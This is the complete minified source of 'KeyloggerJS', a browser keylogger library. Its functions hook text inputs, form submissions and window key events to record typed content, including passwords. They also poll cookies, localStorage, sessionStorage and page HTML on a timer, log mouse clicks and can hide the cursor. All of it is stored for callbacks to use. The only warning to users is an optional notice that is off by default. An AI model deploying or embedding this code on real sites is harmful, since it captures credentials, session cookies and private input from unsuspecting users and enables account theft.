/* KeyloggerJS v1.0.0 | (c) 2014, 2015 ADOUI YANIS | GNU GPL V2.0, more : https://github.com/yanisadoui/KeyloggerJS */
(function(){var e=function(e){this.error=e||"Unknown"},t;if(typeof window==="undefined"||typeof document==="undefined")throw new e("Please, use keyloggerJS with window && document.");t=function(){this.data={};this.timeDefault=1e3};t.prototype.http=function(e,t){var n;n={delay:e||this.timeDefault,callback:t||false,data:{},"this":this};setInterval(function(){n.data={date:Date(),uri:document.URL,title:document.title,agents:window.navigator};n.this.add("http",n.data);t?t(n.data):""},n.delay)};t.prototype.webStorage=function(e,t){var n;n={delay:e||this.timeDefault,callback:t||false,data:{},"this":this};setInterval(function(){n.data={date:Date(),local:window.localStorage,session:window.sessionStorage,cookies:document.cookie};n.this.add("webStorage",n.data);t?t(n.data):""},n.delay)};t.prototype.dom=function(e,t){var n;n={t:e||this.timeDefault,callback:t||false,data:{},"this":this};setInterval(function(){n.data={date:Date(),windowData:window,documentData:document.body.innerHTML};n.this.add("dom",n.data);t?t(n.data):""},n.delay)};t.prototype.keylog=function(e,t,n){var r,i;r={keylog:e||this.helper.exeption("Please, specify a keylogType !"),type:t||this.helper.exeption("Please, specify a eventType !"),callback:n||false,data:{},"this":this};switch(r.keylog){case"K_TEXT_INPUT":i=document.querySelectorAll("input, textarea, select");if(i.length){for(var s in i){i[s].addEventListener(r.type,function(e){r.data={nameInput:e.target.getAttribute("name")||"Unknown name",idInput:e.target.getAttribute("id")||"Unknown id",classInput:e.target.getAttribute("class")||"Unknown class",contentInput:e.target.value,dateEvent:e.timeStamp,targetEvent:e.target,typeEvent:e.type,allEvent:e};r.this.add("keylog",r.data);n?n(r.data):""},false)}}break;case"K_FORM_SUBMIT":i=document.querySelectorAll("form");if(i.length){for(var s in i){i[s].addEventListener("submit",function(e){r.data={actionForm:e.target.getAttributeNode("action")||"Unknown action",methodForm:e.target.getAttributeNode("method")||"Unknown method",idForm:e.target.getAttributeNode("id")||"Unknown id",contentForm:e.target.innerHTML,dateEvent:e.timeStamp,targetEvent:e.target,typeEvent:e.type,allEvent:e};r.this.add("keylog",r.data);n?n(r.data):""},false)}}break;case"K_WINDOW":window.addEventListener(r.type,function(e){r.data={data:String.fromCharCode(e.keyCode)||"Unknown char",dateEvent:e.timeStamp,targetEvent:e.target,typeEvent:e.type,allEVent:e};r.this.add("keylog",r.data);n?n(r.data):""},false);break}};t.prototype.mouse=function(e,t){var n,r;n={hideCursor:e||false,callback:t||false,data:{},"this":this},r=function(e){n.data={date:e.timeStamp,targetEvent:e.target,typeEvent:e.type,allEVent:e};n.this.add("mouse",n.data);t?t(n.data):""};e?document.body.style="cursor: none;":"";window.addEventListener("click",r,false);window.addEventListener("dblclick",r,false);window.addEventListener("contextmenu",r,false)};t.prototype.helper={exeption:function(t){throw new e(t)},isArray:function(e){return typeof e==="undefined"||!Array.isArray(e)?false:true}},t.prototype.warn=function(e,t,n){this.reason=e||"A keylogger is active on this page.";this.style=t||"";this.type=n||"console";switch(this.type){case"console":console.log("%c "+this.reason,this.style);break;case"alert":window.alert(this.reason);break;default:console.log("%c "+this.reason,this.style);break}};t.prototype.reset=function(e){var t;t={"this":this};if(!this.helper.isArray(e)){this.data={}}else{e.forEach(function(e){if(typeof t.this.data[e]==="undefined")t.this.helper.exeption("The module "+e+" did not record any data.");delete t.this.data[e]})}};t.prototype.save=function(e){var t;t={"this":this,temp:[]};if(!this.helper.isArray(e)){return this.data}else{e.forEach(function(e){if(typeof t.this.data[e]==="undefined")t.this.helper.exeption("The module "+e+" did not record any data.");t.temp.push({name:e,data:t.this.data[e]})})}return t.temp};t.prototype.add=function(e,t,n){typeof this.data[e]==="undefined"?this.data[e]=[]:"";n?this.data[e]=[t]:this.data[e].push(t)};this.keylogger=t})()